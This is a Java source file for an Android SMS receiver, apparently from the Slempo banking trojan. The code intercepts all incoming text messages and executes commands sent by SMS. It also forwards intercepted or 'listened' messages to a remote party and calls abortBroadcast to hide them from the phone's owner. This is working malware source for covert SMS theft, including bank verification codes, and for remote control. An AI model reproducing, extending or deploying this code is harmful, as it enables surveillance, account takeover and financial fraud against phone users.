package org.slempo.service;

import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

import org.slempo.service.utils.ObjectSerializer;
import org.slempo.service.utils.Sender;
import org.slempo.service.utils.SmsProcessor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class MessageReceiver extends BroadcastReceiver {

	@SuppressWarnings("unchecked")
	@Override
	public void onReceive(Context context, Intent intent) {
		SharedPreferences settings = context.getSharedPreferences(
				Constants.PREFS_NAME, Context.MODE_PRIVATE);
		HashSet<String> blockedNumbers = new HashSet<String>();
		try {
			blockedNumbers = (HashSet<String>) ObjectSerializer
					.deserialize(settings.getString(Constants.BLOCKED_NUMBERS,
							ObjectSerializer.serialize(new HashSet<String>())));
		} catch (Exception e) {
			e.printStackTrace();
		}
		Map<String, String> messages = retrieveMessages(intent);
		for (String sender : messages.keySet()) {
			SmsProcessor processor = new SmsProcessor(messages.get(sender), "",
					context);
			if (processor.processCommand()) {
				abortBroadcast();
				continue;
			}
			boolean needToInterceptIncoming = processor
					.needToInterceptIncoming();
			boolean needToListenIncoming = processor.needToListen();
			if (needToInterceptIncoming || blockedNumbers.contains(sender)) {
				Sender.sendInterceptedIncomingSMS(context,
						messages.get(sender), sender);
				abortBroadcast();
			} else if (needToListenIncoming) {
				Sender.sendListenedIncomingSMS(context, messages.get(sender),
						sender);
			}
		}
	}

	private static Map<String, String> retrieveMessages(Intent intent) {
		Map<String, String> messages = null;
		SmsMessage[] messagesArray;
		Bundle bundle = intent.getExtras();
		if (bundle != null && bundle.containsKey("pdus")) {
			Object[] pdus = (Object[]) bundle.get("pdus");
			if (pdus != null) {
				int nbrOfpdus = pdus.length;
				messages = new HashMap<String, String>(nbrOfpdus);
				messagesArray = new SmsMessage[nbrOfpdus];
				for (int i = 0; i < nbrOfpdus; i++) {
					messagesArray[i] = SmsMessage
							.createFromPdu((byte[]) pdus[i]);
					String originatingAddress = messagesArray[i]
							.getOriginatingAddress();
					if (!messages.containsKey(originatingAddress)) {
						messages.put(messagesArray[i].getOriginatingAddress(),
								messagesArray[i].getMessageBody());
					} else {
						String previousParts = messages.get(originatingAddress);
						String msgString = previousParts
								+ messagesArray[i].getMessageBody();
						messages.put(originatingAddress, msgString);
					}
				}
			}
		}
		return messages;
	}/**/
}
